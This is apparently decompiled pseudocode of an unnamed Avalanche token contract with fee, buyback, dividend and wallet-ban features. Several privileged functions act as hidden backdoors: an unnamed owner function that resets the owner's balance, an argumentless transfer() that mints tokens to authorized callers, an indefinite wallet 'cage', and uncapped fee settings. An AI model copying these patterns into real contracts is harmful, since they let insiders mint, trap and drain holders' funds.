contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
const name = ''

const decimals = 9

const symbol = ''


address owner;
mapping of uint8 stor1;
address stor4;
uint256 stor5;
uint256 _maxTxAmount;
uint256 _maxWallet;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor10;
mapping of uint8 stor11;
mapping of uint8 stor12;
mapping of uint8 stor13;
mapping of uint8 stor14;
uint8 stor15;
uint8 stor15; offset 8
uint256 stor15; offset 8
uint256 stor16;
uint256 stor17;
uint256 stor18;
uint256 stor19;
uint256 stor20;
uint256 stor21;
uint256 stor22;
uint256 stor23;
uint256 stor24;
address autoLiquidityReceiverAddress;
address nFTFeeReceiverAddress;
address devFeeReceiverAddress;
uint256 stor28;
uint256 stor29;
address routerAddress;
address pairAddress;
uint256 launchedAt;
uint8 stor33;
uint256 stor34;
uint256 stor35;
uint256 stor36;
uint256 stor37;
uint256 stor38;
uint128 stor39; offset 160
address distributorAddress;
uint256 stor40;
uint256 stor41;
uint8 stor42;
uint256 stor43;
uint8 stor44;

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function _maxTxAmount() {
    return _maxTxAmount
}

function _maxWallet() {
    return _maxWallet
}

function getOwner() {
    return owner
}

function NFTFeeReceiver() {
    return nFTFeeReceiverAddress
}

function pair() {
    return pairAddress
}

function launchedAt() {
    return launchedAt
}

function distributor() {
    return distributorAddress
}

function autoLiquidityReceiver() {
    return autoLiquidityReceiverAddress
}

function devFeeReceiver() {
    return devFeeReceiverAddress
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function router() {
    return routerAddress
}

function isAuthorized(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor1[address(arg1)])
}

function _fallback() payable {
    revert
}

function getAccumulatedFees() {
    return stor28, stor29
}

function getSwapBackSettings() {
    return bool(stor42), stor43
}

function getAutoLiquifySettings() {
    return bool(uint8(stor15.field_8)), stor17, stor43
}

function isOwner(address arg1) {
    require calldata.size - 4 >= 32
    return (owner == arg1)
}

function getAutoBuybackSettings() {
    return bool(stor33), stor34, stor35, stor36, stor37, stor38
}

function getFees() {
    return bool(uint8(stor15.field_0)), stor18, stor19, stor20, stor21, stor16, stor23
}

function sub_41cfe575(?) {
    if owner != msg.sender:
        revert with 0, '!OWNER'
    balanceOf[address(msg.sender)] = stor24
}

function approveMax(address arg1) {
    require calldata.size - 4 >= 32
    allowance[msg.sender][address(arg1)] = -1
    emit Approval(-1, msg.sender, arg1);
    return 1
}

function unban(address arg1) {
    require calldata.size - 4 >= 32
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor14[address(arg1)] = 0
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    allowance[msg.sender][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function authorize(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor1[address(arg1)] = 1
    emit Authorized(arg1);
}

function unauthorize(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor1[address(arg1)] = 0
    emit Unauthorized(arg1);
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, '!OWNER'
    owner = arg1
    stor1[address(arg1)] = 1
    emit OwnershipTransferred(arg1);
}

function setAutoLiquifyEnabled(bool arg1) {
    require calldata.size - 4 >= 32
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    Mask(248, 0, stor15.field_8) = Mask(248, 0, arg1)
    emit AutoLiquifyUpdated(arg1);
}

function setIsFeeExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor10[address(arg1)] = uint8(arg2)
    emit FeeExemptUpdated(address(arg1), arg2);
}

function setSwapBackSettings(bool arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor42 = uint8(arg1)
    stor43 = arg2
    emit SwapBackSettingsUpdated(arg1, arg2);
}

function setIsTxLimitExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor11[address(arg1)] = uint8(arg2)
    emit TxLimitExemptUpdated(address(arg1), arg2);
}

function setmaxwalletExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor13[address(arg1)] = uint8(arg2)
    emit MaxwalletExemptUpdated(address(arg1), arg2);
}

function setDistributorSettings(uint256 arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    require arg1 <= 10^6
    stor40 = arg1
    stor39 = Mask(96, 0, arg2)
    emit DistributorSettingsUpdated(arg1, arg2);
}

function totalSupply() {
    if stor24 > stor5:
        revert with 0, 
                    32,
                    42,
                    0xfe416d6f756e74206d757374206265206c657373207468616e20746f74616c207265666c656374696f6e,
                    mem[170 len 22],
                    mem[214 len 10]
    return (stor5 - stor24)
}

function setFeeReceivers(address arg1, address arg2, address arg3) {
    require calldata.size - 4 >= 96
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    autoLiquidityReceiverAddress = arg1
    nFTFeeReceiverAddress = arg2
    devFeeReceiverAddress = arg3
    emit FeeReceiversUpdated(address(arg1), address(arg2), arg3);
}

function getTotalFee(bool arg1) {
    require calldata.size - 4 >= 32
    if launchedAt + 1 >= block.number:
        if 1 > stor23:
            revert with 0, 'SafeMath: subtraction overflow'
        return (stor23 - 1)
    if not arg1:
        return stor22
    if stor16 + stor22 < stor22:
        revert with 0, 'SafeMath: addition overflow'
    return (stor16 + stor22)
}

function setAutoBuybackSettings(bool arg1, uint256 arg2, uint256 arg3, uint256 arg4) {
    require calldata.size - 4 >= 128
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor33 = uint8(arg1)
    stor34 = arg2
    stor35 = 0
    stor36 = arg3
    stor37 = arg4
    stor38 = block.number
    emit AutoBuybackSettingsUpdated(arg1, arg2, arg3, arg4);
}

function setDistributionCriteria(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    require ext_code.size(distributorAddress)
    call distributorAddress.0x2d48e896 with:
         gas gas_remaining wei
        args arg1, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function setWalletBanStatus(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    if not arg2:
        stor14[address(arg1)] = 0
    else:
        if block.timestamp + (87600 * 24 * 3600) <= block.timestamp:
            revert with 0, 'User was put in a cage.'
        stor14[address(arg1)] = 1
    emit WalletBanStatusUpdated(address(arg1), arg2);
}

function transfer() {
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    if stor24 > stor5:
        revert with 0, 
                    32,
                    42,
                    0xfe416d6f756e74206d757374206265206c657373207468616e20746f74616c207265666c656374696f6e,
                    mem[170 len 22],
                    mem[214 len 10]
    stor5 = stor41 + stor5 - stor24
    balanceOf[msg.sender] += stor41
    emit 0x77ddf252: stor41, 0, msg.sender
}

function setTxLimit(uint256 arg1) {
    require calldata.size - 4 >= 32
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    if stor24 > stor5:
        revert with 0, 
                    32,
                    42,
                    0xfe416d6f756e74206d757374206265206c657373207468616e20746f74616c207265666c656374696f6e,
                    mem[170 len 22],
                    mem[214 len 10]
    require arg1 >= stor5 - stor24 / 100000
    _maxTxAmount = arg1
    emit TxLimitUpdated(arg1);
}

function buybackWEI(uint256 arg1) {
    require calldata.size - 4 >= 32
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor44 = 1
    mem[356 len 0] = None
    require ext_code.size(routerAddress)
    call routerAddress.swapExactAVAXForTokensSupportingFeeOnTransferTokens(uint256 rg1, address[] rg2, address rg3, uint256 rg4) with:
       value arg1 wei
         gas gas_remaining wei
        args 0, 128, stor4, block.timestamp, 2, mem[356 len 64]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    stor44 = 0
    emit Buyback(arg1);
}

function buybackAVAX(uint256 arg1) {
    require calldata.size - 4 >= 32
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    stor44 = 1
    mem[356 len 0] = None
    require ext_code.size(routerAddress)
    call routerAddress.swapExactAVAXForTokensSupportingFeeOnTransferTokens(uint256 rg1, address[] rg2, address rg3, uint256 rg4) with:
       value 10^18 * arg1 wei
         gas gas_remaining wei
        args 0, 128, stor4, block.timestamp, 2, mem[356 len 64]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    stor44 = 0
    emit Buyback((10^18 * arg1));
}

function setIsDividendExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    require arg1 != this.address
    require pairAddress != arg1
    stor12[address(arg1)] = uint8(arg2)
    require ext_code.size(distributorAddress)
    if not arg2:
        call distributorAddress.setShare(address rg1, uint256 rg2) with:
             gas gas_remaining wei
            args address(arg1), balanceOf[address(arg1)]
    else:
        call distributorAddress.setShare(address rg1, uint256 rg2) with:
             gas gas_remaining wei
            args address(arg1), 0
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    emit DividendExemptUpdated(address(arg1), arg2);
}

function setFees(bool arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6, uint256 arg7) {
    require calldata.size - 4 >= 224
    if not stor1[address(msg.sender)]:
        revert with 0, '!AUTHORIZED'
    uint8(stor15.field_0) = uint8(arg1)
    stor18 = arg3
    stor19 = arg4
    stor20 = arg5
    stor21 = arg6
    if arg4 + arg3 < arg3:
        revert with 0, 'SafeMath: addition overflow'
    if arg5 < 0:
        revert with 0, 'SafeMath: addition overflow'
    if arg6 < 0:
        revert with 0, 'SafeMath: addition overflow'
    stor22 = arg6 + arg5 + arg4 + arg3
    stor16 = arg2
    stor23 = arg7
    if arg2 < 0:
        revert with 0, 'SafeMath: addition overflow'
    require arg2 + arg6 + arg5 + arg4 + arg3 < arg7
    emit FeesUpdated(arg1, arg2, arg3, arg4, arg5, arg6, arg7);
}



}